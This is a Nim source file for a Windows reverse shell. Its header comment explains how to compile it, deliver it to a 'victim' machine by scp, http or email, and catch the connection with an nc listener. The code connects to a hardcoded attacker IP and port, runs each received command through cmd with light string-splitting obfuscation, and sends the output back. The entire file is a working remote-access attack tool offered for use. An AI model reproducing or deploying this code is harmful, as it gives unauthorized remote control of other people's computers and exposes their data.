#[ 
   Created by Sn1r
   https://github.com/Sn1r/
   
   First install nim: sudo apt install nim
   Compile it: 
    nim c -d:mingw --app:gui revshell.nim
   upload the file to the victims machine (scp, http, email, ...)
   Run a listener in the kali machine on port 8080: nc -nlvp 8080
   Execute it in the victim machine
   This was detected in a Windows 11

 ]#

import net, os, osproc, strutils

proc exe(c: string): string =
  result = execProcess("cm" & "d /c " & c)

var
  v = newSocket()

  # Change this
  v1 = "192.168.31.200"
  v2 = "8080"

  s4 = "Exiting.."
  s5 = "cd"
  s6 = "C:\\"

try:
  v.connect(v1, Port(parseInt(v2)))

  while true:
    v.send(os.getCurrentDir() & "> ")
    let c = v.recvLine()
    if c == "exit":
      v.send(s4)
      break

    if c.strip() == s5:
      os.setCurrentDir(s6)
    elif c.strip().startswith(s5):
      let d = c.strip().split(' ')[1]
      try:
        os.setCurrentDir(d)
      except OSError as b:
        v.send(repr(b) & "\n")
        continue
    else:
      let r = exe(c)
      v.send(r)

except:
  raise
finally:
  v.close